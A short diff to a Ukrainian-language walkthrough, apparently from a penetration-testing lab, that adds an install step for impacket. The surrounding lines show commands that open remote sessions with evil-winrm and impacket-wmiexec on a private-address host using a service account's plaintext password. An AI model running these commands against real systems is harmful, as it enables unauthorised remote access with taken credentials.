@@ -169,6 +169,12 @@ evil-winrm -i 10.10.50.150 -u svc_deploy -p 'Deploy@2024!Drone'
 ```
 
 АБО через impacket (якщо evil-winrm не встановився):
+
+Встановити impacket:
+```
+sudo apt install -y python3-impacket
+```
+
 ```
 impacket-wmiexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
 ```
